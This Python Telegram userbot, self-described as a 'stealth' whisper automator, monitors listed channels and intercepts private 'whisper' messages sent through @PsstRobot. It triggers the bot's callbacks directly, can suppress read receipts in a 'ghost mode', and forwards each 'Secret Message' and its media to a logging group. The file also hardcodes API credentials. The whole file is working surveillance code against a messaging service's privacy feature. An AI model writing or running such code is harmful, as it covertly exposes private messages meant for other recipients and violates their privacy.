import asyncio
from datetime import datetime
import os
import re
import sys
import time
import traceback
from aiohttp import web
from telethon import TelegramClient, events
from telethon.sessions import StringSession
from telethon.tl.functions.messages import GetBotCallbackAnswerRequest

# ==================== CONFIGURATION ====================
API_ID = 23782654
API_HASH = "5b001caca4f436c940fea5e060f0a3c0"
SESSION_STRING = os.environ.get("SESSION_STRING")

TARGET_CHANNELS = [
    "chatpateee", -1002133821583,
    "its_diyaa", -1004469467503,
    "UnhingedAspirand", -1003954728685,
    "channelizpublick", -1004303326817,
    "fewmehh", -1004466801780,
    "vidsyapin", -1004293474310,
]

WHISPER_BOT_ID = 518335359  # @PsstRobot
LOG_GROUP_ID = -1004402300724

GHOST_MODE = False
STATS = {"total": 0, "text": 0, "media": 0}
ctx = {"title": "Target", "link": "#", "time": 0}

client = TelegramClient(StringSession(SESSION_STRING), API_ID, API_HASH)

# ==================== PERSISTENCE ====================
async def load_config():
    global TARGET_CHANNELS, GHOST_MODE, STATS
    try:
        async for msg in client.iter_messages(LOG_GROUP_ID, search="#WHISPER_CONFIG"):
            if msg.text and "#WHISPER_CONFIG" in msg.text:
                lines = msg.text.split("\n")
                new_list = []
                for line in lines:
                    line = line.strip(" `•")
                    if "GHOST_MODE:" in line: GHOST_MODE = "true" in line.lower()
                    elif "STAT_TOTAL:" in line: STATS["total"] = int(line.split(":")[-1])
                    elif "STAT_TEXT:" in line: STATS["text"] = int(line.split(":")[-1])
                    elif "STAT_MEDIA:" in line: STATS["media"] = int(line.split(":")[-1])
                    elif line and not line.startswith("#") and ":" not in line:
                        if line.lstrip("-").isdigit(): new_list.append(int(line))
                        else: new_list.append(line.lower())
                if new_list: TARGET_CHANNELS = list(set(new_list))
                break
    except: pass

async def save_config():
    targets = sorted(list(set(TARGET_CHANNELS)), key=lambda x: str(x))
    text = (
        f"#WHISPER_CONFIG\n"
        f"GHOST_MODE: {str(GHOST_MODE).lower()}\n"
        f"STAT_TOTAL: {STATS['total']}\n"
        f"STAT_TEXT: {STATS['text']}\n"
        f"STAT_MEDIA: {STATS['media']}\n\n"
        f"TARGETS:\n" + "\n".join([f"• `{c}`" for c in targets])
    )
    async for msg in client.iter_messages(LOG_GROUP_ID, search="#WHISPER_CONFIG"):
        await msg.edit(text)
        return
    await client.send_message(LOG_GROUP_ID, text)

# ==================== CORE LOGIC ====================
def is_target(event):
    chat_id = event.chat_id
    user = getattr(event.chat, 'username', None)
    for t in TARGET_CHANNELS:
        if (isinstance(t, int) and t == chat_id) or (isinstance(t, str) and user and t.lower() == user.lower()):
            return True
    return False

def format_log(content, chat_name, speed, link, is_media=False):
    tag = " (Advanced Media)" if is_media else ""
    return (
        f"🔓 **Whisper Intercepted{tag}!**\n\n"
        f"📝 **Secret Message:**\n`{content}`\n\n"
        f"📍 **Channel:** {chat_name}\n"
        f"⚡ **Speed:** `{speed} ms`\n"
        f"🔗 [Message Link]({link})"
    )

@client.on(events.NewMessage())
async def router(event):
    global TARGET_CHANNELS, GHOST_MODE, STATS

    # --- COMMANDS ---
    if event.chat_id == LOG_GROUP_ID and event.raw_text.startswith("/"):
        text = event.raw_text.split()
        cmd = text[0].lower()
        arg = text[1] if len(text) > 1 else None

        if cmd == "/stats":
            await event.reply(f"📊 **Stats:**\nTotal: `{STATS['total']}`\nText: `{STATS['text']}`\nMedia: `{STATS['media']}`\nGhost: `{'ON 👻' if GHOST_MODE else 'OFF'}`")
        elif cmd == "/list":
            await event.reply(f"📋 **Targets:** `{'ON 👻' if GHOST_MODE else 'OFF'}`\n" + "\n".join([f"• `{c}`" for c in TARGET_CHANNELS]))
        elif cmd == "/ghost":
            if arg in ["on", "off"]:
                GHOST_MODE = (arg == "on")
                await save_config()
                await event.reply(f"Ghost Mode: `{'ON 👻' if GHOST_MODE else 'OFF'}`")
            else: await event.reply("Use `/ghost on` or `/ghost off`.")
        elif cmd == "/add" and arg:
            val = arg.replace("@","").replace("https://t.me/","")
            TARGET_CHANNELS.append(int(val) if val.lstrip("-").isdigit() else val.lower())
            await save_config(); await event.reply(f"✅ Added: `{arg}`")
        elif cmd == "/del" and arg:
            val = arg.replace("@","").replace("https://t.me/","")
            TARGET_CHANNELS = [c for c in TARGET_CHANNELS if str(c).lower() != val.lower()]
            await save_config(); await event.reply(f"🗑️ Removed: `{arg}`")
        return

    # --- WHISPER INTERCEPTION ---
    if is_target(event) and event.buttons:
        # Ghost Mode: Do NOT mark as read
        if not GHOST_MODE:
            try: await client.send_read_acknowledge(event.chat_id, max_id=event.id)
            except: pass

        start = time.perf_counter()
        chat_name = event.chat.title or "Target"
        link = f"https://t.me/c/{str(event.chat_id).replace('-100','')}/{event.id}"
        
        try:
            payload = None
            for row in event.buttons:
                for btn in row:
                    if btn.url and 'PsstRobot?start=' in btn.url: payload = btn.url.split('start=')[-1]

            # Stealth Interaction: Raw callback without opening message
            btn = event.buttons[0][0]
            res = await client(GetBotCallbackAnswerRequest(peer=event.chat_id, msg_id=event.id, data=btn.data))
            popup = res.message or ""

            if "-wh::" in popup:
                match = re.search(r"-wh::[a-zA-Z0-9_=]+", popup)
                if match: payload = match.group(0)

            if payload or "advanced" in popup.lower():
                ctx.update({"title": chat_name, "link": link, "time": start})
                await client.send_message(WHISPER_BOT_ID, f"/start {payload}" if payload else "/start")
            elif popup:
                ms = round((time.perf_counter() - start) * 1000, 2)
                STATS["total"] += 1; STATS["text"] += 1
                asyncio.create_task(save_config())
                await client.send_message(LOG_GROUP_ID, format_log(popup, chat_name, ms, link), link_preview=False)
        except Exception as e: print(f"Error: {e}")

@client.on(events.NewMessage(from_users=WHISPER_BOT_ID))
async def dm_handler(event):
    if event.buttons: await event.click(0); return
    if event.message.text and any(x in event.message.text for x in ["Preparing", "/start"]): return
    try:
        ms = round((time.perf_counter() - ctx["time"]) * 1000, 2)
        STATS["total"] += 1; STATS["media"] += 1
        asyncio.create_task(save_config())
        msg = format_log(event.message.text or "[Media]", ctx['title'], ms, ctx['link'], True)
        await client.send_message(LOG_GROUP_ID, msg, file=event.message.media, link_preview=False)
        await client.send_read_acknowledge(event.chat_id)
    except: pass

async def main():
    await client.start()
    await client.get_dialogs(); await load_config()
    await client.send_message(LOG_GROUP_ID, f"🤖 **Whisper Automator V5 Stealth Online!**\nGhost Mode: `{'ON 👻' if GHOST_MODE else 'OFF'}`")
    port = int(os.environ.get("PORT", 10000))
    app = web.Application(); app.router.add_get("/", lambda r: web.Response(text="Active"))
    runner = web.AppRunner(app); await runner.setup()
    await web.TCPSite(runner, "0.0.0.0", port).start()
    await client.run_until_disconnected()

if __name__ == "__main__": asyncio.run(main())
